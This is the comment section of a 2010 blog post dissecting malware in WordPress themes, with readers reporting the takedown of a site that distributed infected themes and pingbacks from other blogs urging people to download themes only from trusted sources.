		<time itemprop="dateCreated" datetime="2010-12-12T21:16:54+00:00">December 12, 2010 at 9:16 pm</time></a>	</div>

	<div itemprop="text"><p>How do you propose for &#8220;WordPress&#8221; to disallow such sites from distributing infected Themes?</p>
<p>If such sites are violating the WordPress Trademark policy regarding domain names, then the WordPress Foundation has some recourse to take down trademark-violating domain names. Otherwise, WordPress has no more recourse than anyone else.</p>
<p>FYI, I contacted the registrar for top-themes.com, and got no response. I also reported the site to Google, and also got no response.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6137#respond' onclick='return addComment.moveForm("div-comment-6137", "6137", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	<ul class="children">
	<li class="comment odd alt depth-3 parent" id="comment-6144" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6144" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://0.gravatar.com/avatar/a084125c824d274ff40cb834cf9f544a?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://pixopoint.com/' rel='external nofollow' class='url'>Ryan</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6144">
		<time itemprop="dateCreated" datetime="2010-12-13T03:34:58+00:00">December 13, 2010 at 3:34 am</time></a>	</div>

	<div itemprop="text"><p>You are best off contacting their web host to have a site taken down.</p>
<p>Contacting their registrar is unlikely to be of any help at all unfortunately.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6144#respond' onclick='return addComment.moveForm("div-comment-6144", "6144", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	<ul class="children">
	<li class="comment even depth-4" id="comment-6161" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6161" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://1.gravatar.com/avatar/1299e8d336a2d5faa4fc440d07ea44f8?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://www.chipbennett.net/' rel='external nofollow' class='url'>Chip Bennett</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6161">
		<time itemprop="dateCreated" datetime="2010-12-13T21:13:18+00:00">December 13, 2010 at 9:13 pm</time></a>	</div>

	<div itemprop="text"><p>Believe it or not: the registrar just replied to my email. They&#8217;ve taken down top-themes.com.</p>
<p>Shout out to fabulous.com for doing the right thing!</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6161#respond' onclick='return addComment.moveForm("div-comment-6161", "6161", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
	<li class="pingback odd alt thread-even depth-1" id="comment-6146" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6146" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='https://ariotek.co.uk/forums/f36/wordpress-theme-malware-6605/#post50211' rel='external nofollow' class='url'>WordPress Theme Malware</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6146">
		<time itemprop="dateCreated" datetime="2010-12-13T07:45:06+00:00">December 13, 2010 at 7:45 am</time></a>	</div>

	<div itemprop="text"><p>[...] has published an article with examples of where to look for compromised code.  Full article at: <a href="http://ottopress.com/2010/anatomy-of-a-theme-malware/" rel="nofollow">http://ottopress.com/2010/anatomy-of-a-theme-malware/</a>  Ottopress recommend getting your free themes from WordPress.org Extend-Themes instead.  WordPress [...]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6146#respond' onclick='return addComment.moveForm("div-comment-6146", "6146", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback even thread-odd thread-alt depth-1" id="comment-6155" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6155" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://wpcandy.com/linked/power-of-wordpress-edition' rel='external nofollow' class='url'>Community links: Power of WordPress edition | WPCandy</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6155">
		<time itemprop="dateCreated" datetime="2010-12-13T16:01:45+00:00">December 13, 2010 at 4:01 pm</time></a>	</div>

	<div itemprop="text"><p>[...] posted about his findings when tearing apart a set of themes ridden with malware. Jeff Chandler followed up with a few [...]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6155#respond' onclick='return addComment.moveForm("div-comment-6155", "6155", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback odd alt thread-even depth-1" id="comment-6304" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6304" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://geeks4share.com/blog/2010/12/wordpress-theme-malware/' rel='external nofollow' class='url'>Wordpress Theme Malware -</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6304">
		<time itemprop="dateCreated" datetime="2010-12-27T09:14:59+00:00">December 27, 2010 at 9:14 am</time></a>	</div>

	<div itemprop="text"><p>[...] Additionally, this malware sends notification to its creator about it existence on a server and allows him to insert links on writable theme files on a wordpress installation. Otto, the coder of my Gravatar Hovercards plugin, wrote a post called Anatomy of a Theme Malware where he explains the nature of this malware. Read here [...]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6304#respond' onclick='return addComment.moveForm("div-comment-6304", "6304", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback even thread-odd thread-alt depth-1" id="comment-6657" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-6657" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://wpmu.org/why-you-should-never-search-for-free-wordpress-themes-in-google-or-anywhere-else/' rel='external nofollow' class='url'>Why You Should Never Search For Free WordPress Themes in Google or Anywhere Else - WordPress, Multisite and BuddyPress plugins, themes, news and help &#8211; WPMU.org</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-6657">
		<time itemprop="dateCreated" datetime="2011-01-11T09:02:39+00:00">January 11, 2011 at 9:02 am</time></a>	</div>

	<div itemprop="text"><p>[...] Otto on the Anatomy of a Theme Malware [...]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=6657#respond' onclick='return addComment.moveForm("div-comment-6657", "6657", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback odd alt thread-even depth-1" id="comment-7550" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-7550" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://ottopress.com/2011/scanning-for-malicious-code-is-pointless/' rel='external nofollow' class='url'>&#8220;Scanning&#8221; for Malicious Code is Pointless &raquo; Otto on WordPress</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-7550">
		<time itemprop="dateCreated" datetime="2011-03-08T12:47:04+00:00">March 8, 2011 at 12:47 pm</time></a>	</div>

	<div itemprop="text"><p>[...] gotten a few responses back to some of my malware related posts asking why WordPress doesn&#8217;t check for this sort of thing in the core code. Why can&#8217;t [...]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=7550#respond' onclick='return addComment.moveForm("div-comment-7550", "7550", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback even thread-odd thread-alt depth-1" id="comment-7980" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-7980" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://lorelle.wordpress.com/2011/04/05/is-your-wordpress-blog-at-risk-from-the-epsilon-email-theft/' rel='external nofollow' class='url'>Is Your WordPress Blog at Risk from the Epsilon Email Theft? &laquo; Lorelle on WordPress</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-7980">
		<time itemprop="dateCreated" datetime="2011-04-05T21:34:38+00:00">April 5, 2011 at 9:34 pm</time></a>	</div>

	<div itemprop="text"><p>[...] specifically WordPress Themes, Plugins, and out-of-date versions of WordPress. WordPress expert, Otto of OttoPress investigated a WordPress malware hack last year, uncovering the insidious methods they use. Having had two of my sites and a few [...]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=7980#respond' onclick='return addComment.moveForm("div-comment-7980", "7980", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback odd alt thread-even depth-1" id="comment-8155" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-8155" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://www.chipbennett.net/2010/12/10/only-download-wordpress-themes-from-trusted-sources/' rel='external nofollow' class='url'>Only Download WordPress Themes From Trusted Sources &raquo; cb.blog</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-8155">
		<time itemprop="dateCreated" datetime="2011-04-20T20:30:33+00:00">April 20, 2011 at 8:30 pm</time></a>	</div>

	<div itemprop="text"><p>[...] and redistribution. However, these Theme modifications turned out to be insidiously malicious. As Otto explains, Themes distributed by the site in question had been hacked to (among other things) include a [...]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=8155#respond' onclick='return addComment.moveForm("div-comment-8155", "8155", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback even thread-odd thread-alt depth-1" id="comment-8520" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-8520" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://www.ctzdesign.com/only-download-wordpress-themes-from-reputable-sources/' rel='external nofollow' class='url'>Only Download WordPress Themes from Reputable Sources | ctzdesign - web development and consulting by Charlie Zegers</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-8520">
		<time itemprop="dateCreated" datetime="2011-05-28T19:47:30+00:00">May 28, 2011 at 7:47 pm</time></a>	</div>

	<div itemprop="text"><p>[...] malware and it’s worth investigating to see some of the ways people try to hide their spam.via Anatomy of a Theme Malware » Otto on WordPress.Now, this is not intended to imply that all WordPress theme download sites are bad, or that you [...]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=8520#respond' onclick='return addComment.moveForm("div-comment-8520", "8520", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback odd alt thread-even depth-1" id="comment-8562" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-8562" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://hackertarget.com/2011/06/malware-in-wordpress-themes/' rel='external nofollow' class='url'>Malware in WordPress Themes | HackerTarget.com : Online Security Scan</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-8562">
		<time itemprop="dateCreated" datetime="2011-06-01T01:15:22+00:00">June 1, 2011 at 1:15 am</time></a>	</div>

	<div itemprop="text"><p>[...] Anatomy of a theme malware [...]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=8562#respond' onclick='return addComment.moveForm("div-comment-8562", "8562", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback even thread-odd thread-alt depth-1" id="comment-10426" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-10426" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://zeeweb.olympe-network.com/il-ne-faut-jamais-chercher-un-theme-wordpress-gratuit-sur-un-moteur-de-recherche-wordpress-francophone/' rel='external nofollow' class='url'>Il ne faut jamais chercher un thème WordPress gratuit sur un moteur de recherche | WordPress Francophone | ZeeWebON</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-10426">
		<time itemprop="dateCreated" datetime="2012-01-16T13:31:54+00:00">January 16, 2012 at 1:31 pm</time></a>	</div>

	<div itemprop="text"><p>[...] Otto dissecte les codes malicieux dans les thèmes [...]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=10426#respond' onclick='return addComment.moveForm("div-comment-10426", "10426", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback odd alt thread-even depth-1" id="comment-10450" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-10450" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://blog.threatresearcher.com/2012/01/23/malware-on-wordpress-themes-and-joomla-templates/' rel='external nofollow' class='url'>- ThreatResearcher ... a blog</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-10450">
		<time itemprop="dateCreated" datetime="2012-01-23T20:46:18+00:00">January 23, 2012 at 8:46 pm</time></a>	</div>

	<div itemprop="text"><p>[...] example of a sneaky trojanized WordPress theme was analyzed in detail by Otto in December of 2010. In it he points out another rule of thumb which is to only download themes from the official [...]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=10450#respond' onclick='return addComment.moveForm("div-comment-10450", "10450", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="comment even thread-odd thread-alt depth-1" id="comment-10682" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-10682" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<img alt='' src='http://0.gravatar.com/avatar/2325869a18bc53b0315974968a939aff?s=48&amp;d=retro&amp;r=X' class='avatar avatar-48 photo' height='48' width='48' />	<cite itemprop="name"><a itemprop='url' href='http://agilewebitedev.com' rel='external nofollow' class='url'>Pali Madra</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-10682">
		<time itemprop="dateCreated" datetime="2012-03-20T07:09:15+00:00">March 20, 2012 at 7:09 am</time></a>	</div>

	<div itemprop="text"><p>It is good to find out that top-themes.com website is not providing anything regarding WordPress.</p>
<p>Otto are you responsible for ensuring the top-themes.com shuts down? If so congratulations! This is perhaps, the best way to tackle such people who are spreading malware by providing infected themes for download.</p>
<p>Thank you for the post as it is very helpful for WordPress Developers like me.</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=10682#respond' onclick='return addComment.moveForm("div-comment-10682", "10682", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback odd alt thread-even depth-1" id="comment-11669" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-11669" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://www.eeze-wordpress.co.za/free-wordpress-themes/' rel='external nofollow' class='url'>Free Wordpress Themes | Eeze Wordpress South Africa</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-11669">
		<time itemprop="dateCreated" datetime="2013-03-07T16:01:08+00:00">March 7, 2013 at 4:01 pm</time></a>	</div>

	<div itemprop="text"><p>[...] Otto on the Anatomy of a Theme Malware [...]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=11669#respond' onclick='return addComment.moveForm("div-comment-11669", "11669", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback even thread-odd thread-alt depth-1" id="comment-12001" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-12001" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://wpmu.org/dodgy-free-wordpress-hosting-themes-plugins/' rel='external nofollow' class='url'>WordPress Traps: Dodgy Freebie Hosting, Themes, Plugins</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-12001">
		<time itemprop="dateCreated" datetime="2013-09-12T18:05:44+00:00">September 12, 2013 at 6:05 pm</time></a>	</div>

	<div itemprop="text"><p>[&#8230;] dangerous themes and plugins are distributed in the wild but some have also cropped up on wordpress.org, usually after a developer has been [&#8230;]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=12001#respond' onclick='return addComment.moveForm("div-comment-12001", "12001", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback odd alt thread-even depth-1" id="comment-12004" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-12004" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://www.iwebspider.com/blog/2013/09/13/hoodwinked-dodgy-free-wordpress-hosting-themes-and-plugins/' rel='external nofollow' class='url'>Hoodwinked: Dodgy Free WordPress Hosting, Themes, and Plugins | iwebspider design and hosting</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-12004">
		<time itemprop="dateCreated" datetime="2013-09-12T23:39:14+00:00">September 12, 2013 at 11:39 pm</time></a>	</div>

	<div itemprop="text"><p>[&#8230;] dangerous themes and plugins are distributed in the wild but some have also cropped up on wordpress.org, usually after a developer has been [&#8230;]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=12004#respond' onclick='return addComment.moveForm("div-comment-12004", "12004", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback even thread-odd thread-alt depth-1" id="comment-12311" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-12311" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://www.dailyblogtips.com/safe-wordpress-theme/' rel='external nofollow' class='url'>One Crucial Thing You MUST Avoid When Choosing a Free WordPress Theme</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-12311">
		<time itemprop="dateCreated" datetime="2014-03-10T09:01:37+00:00">March 10, 2014 at 9:01 am</time></a>	</div>

	<div itemprop="text"><p>[&#8230;] Anatomy of a Theme Malware, Otto, Otto on WordPress [&#8230;]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=12311#respond' onclick='return addComment.moveForm("div-comment-12311", "12311", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback odd alt thread-even depth-1" id="comment-12312" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-12312" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://authreport.com/2014/03/10/one-crucial-thing-you-must-avoid-when-choosing-a-free-wordpress-theme/' rel='external nofollow' class='url'>One Crucial Thing You MUST Avoid When Choosing a Free WordPress Theme | AuthReport.com</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-12312">
		<time itemprop="dateCreated" datetime="2014-03-10T18:00:42+00:00">March 10, 2014 at 6:00 pm</time></a>	</div>

	<div itemprop="text"><p>[&#8230;] Anatomy of a Theme Malware, Otto, Otto on WordPress [&#8230;]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=12312#respond' onclick='return addComment.moveForm("div-comment-12312", "12312", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	<li class="pingback even thread-odd thread-alt depth-1" id="comment-12452" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
		<div id="div-comment-12452" class="comment-body">
		<div class="comment-author" itemprop="author" itemscope itemtype="http://schema.org/Person">
		<cite itemprop="name"><a itemprop='url' href='http://www.scottsevener.com/blog/2014/wordpress-theme-malware/' rel='external nofollow' class='url'>WordPress Theme Malware &#187; ScottSevener.com</a></cite> <span class="says">says:</span>	</div>

	<div class="comment-meta commentmetadata"><a itemprop="url" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/comment-page-1/#comment-12452">
		<time itemprop="dateCreated" datetime="2014-06-30T11:36:52+00:00">June 30, 2014 at 11:36 am</time></a>	</div>

	<div itemprop="text"><p>[&#8230;] <a href="http://ottopress.com/2010/anatomy-of-a-theme-malware/" rel="nofollow">http://ottopress.com/2010/anatomy-of-a-theme-malware/</a> [&#8230;]</p>
</div>

	<div class="reply">
	<a class='comment-reply-link' href='/2010/anatomy-of-a-theme-malware/?replytocom=12452#respond' onclick='return addComment.moveForm("div-comment-12452", "12452", "respond", "355")'>Reply to this comment</a>	</div>
		</div>
	</li><!-- #comment-## -->
	</ol>
	<div class="navigation" style="clear:both">
		<div class="alignleft"></div>
		<div class="alignright"></div>
	</div>
	<div style="clear:both"></div> 								<div id="respond" class="comment-respond">
				<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2010/anatomy-of-a-theme-malware/#respond" style="display:none;">Cancel reply</a></small></h3>
									<form action="http://ottopress.com/wp-comments-post.php" method="post" id="commentform" class="comment-form">
																										<div id="gravbox"></div><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input x-autocompletetype="name-full" id="author" name="author" type="text" value="" size="30" aria-required='true' /></p>
<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input x-autocompletetype="email" id="email" name="email" type="text" value="" size="30" aria-required='true' /></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="text" value="" size="30" /></p>
												<p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" aria-required="true"></textarea></p>						<p class="form-allowed-tags">You may use these <abbr title="HyperText Markup Language">HTML</abbr> tags and attributes:  <code>&lt;a href=&quot;&quot; title=&quot;&quot;&gt; &lt;abbr title=&quot;&quot;&gt; &lt;acronym title=&quot;&quot;&gt; &lt;b&gt; &lt;blockquote cite=&quot;&quot;&gt; &lt;cite&gt; &lt;code&gt; &lt;del datetime=&quot;&quot;&gt; &lt;em&gt; &lt;i&gt; &lt;q cite=&quot;&quot;&gt; &lt;strike&gt; &lt;strong&gt; </code></p><p class="form-allowed-tags">Need to post PHP code? Wrap it in <code>[php]</code> and <code>[/php]</code> tags.						<p class="form-submit">
							<input name="submit" type="submit" id="submit" value="Post Comment" />
							<input type='hidden' name='comment_post_ID' value='355' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
						</p>
						<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="0074094abb" /></p><p class="comment-subscription-form"><input type="checkbox" name="subscribe_comments" id="subscribe_comments" value="subscribe" style="width: auto; -moz-appearance: checkbox; -webkit-appearance: checkbox;" /> <label class="subscribe-label" id="subscribe-label" for="subscribe_comments">Notify me of follow-up comments by email.</label></p><p class="comment-subscription-form"><input type="checkbox" name="subscribe_blog" id="subscribe_blog" value="subscribe" style="width: auto; -moz-appearance: checkbox; -webkit-appearance: checkbox;" /> <label class="subscribe-label" id="subscribe-blog-label" for="subscribe_blog">Notify me of new posts by email.</label></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="172"/></p>					</form>
							</div><!-- #respond -->
			</div>

	
	</div>

	<div id="sidebar">
		<ul>
			
			<li id="paypal-donate" class="widget widget_wpaypal"><h2 class="widgettitle">Buy Otto a Beer</h2>
<div style="margin-top:5px;margin-bottom:5px;text-align:left;">
		<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
		<p><input type="hidden" name="cmd" value="_xclick" />
		<input type="hidden" name="business" value="otto@ottodestruct.com" />
		<input type="hidden" name="item_name" value="Donation to Otto on WordPress" />
		<input type="hidden" name="item_number" value="0" />
		<input type="hidden" name="notify_url" value="" />
		<input type="hidden" name="no_shipping" value="1" /><input type="hidden" name="return" value="http://ottopress.com" />
		<input type="hidden" name="no_note" value="1" />
		<input type="hidden" name="tax" value="0" />
		<input type="hidden" name="bn" value="PP-DonationsBF" />
		<input type="hidden" name="on0" value="Website" />
		Currency: <br />
		<select id="currency_code" name="currency_code">
		<option value="USD">U.S. Dollars</option>
		<option value="AUD">Australian Dollars</option>
		<option value="CAD">Canadian Dollars</option>
		<option value="EUR">Euros</option>
		<option value="GBP">Pounds Sterling</option>
		<option value="JPY">Yen</option></select></p>
		<p>Amount: <br /><input type="text" name="amount" size="16" title="The amount you wish to donate" value="5.00" /></p>
		<p>Website(Optional): <br /><input type="text" size="16" title="Your website (will be displayed)" name="os0" value="" /></p><p><input class="ppimg" type="image" src="https://www.paypal.com/en_US/i/btn/x-click-but21.gif" name="submit" style="border:0;" alt="Make payments with PayPal - fast, free and secure" /></p></form></div></li>
<li id="text-7" class="widget widget_text">			<div class="textwidget">Hey, I also take Bitcoins! Send them to: </br>
<a href="bitcoin:1ottoqnFyTtaB6GiJZxMQ79rsSqBL2ZBg">
<img src="https://chart.googleapis.com/chart?chs=150x150&cht=qr&chl=bitcoin:1ottoqnFyTtaB6GiJZxMQ79rsSqBL2ZBg" /><br />
1ottoqnFyTtaB6GiJZxMQ79rsSqBL2ZBg</a></div>
		</li>
<li id="text-5" class="widget widget_text"><h2 class="widgettitle">Subscribe!</h2>
			<div class="textwidget"><!-- <a href="https://plus.google.com/111166992820603637934?prsrc=3" style="cursor:pointer;display:inline-block;text-decoration:none;color:#333;font:13px/16px arial,sans-serif;"><span style="display:inline-block;font-weight:bold;vertical-align:top;margin-right:5px;margin-top:8px;">Otto on WordPress</span><span style="display:inline-block;vertical-align:top;margin-right:15px;margin-top:8px;">on</span><img src="https://ssl.gstatic.com/images/icons/gplus-32.png" alt="" style="border:0;width:32px;height:32px;"/></a>
-->
<div class="g-plus" data-href="https://plus.google.com/111166992820603637934?rel=publisher" data-width="250" data-height="131" data-theme="light"></div>
</div>
		</li>
<li id="blog_subscription-3" class="widget jetpack_subscription_widget"><h2 class="widgettitle"><label for="subscribe-field"></label></h2>

		<form action="#" method="post" accept-charset="utf-8" id="subscribe-blog-blog_subscription-3">
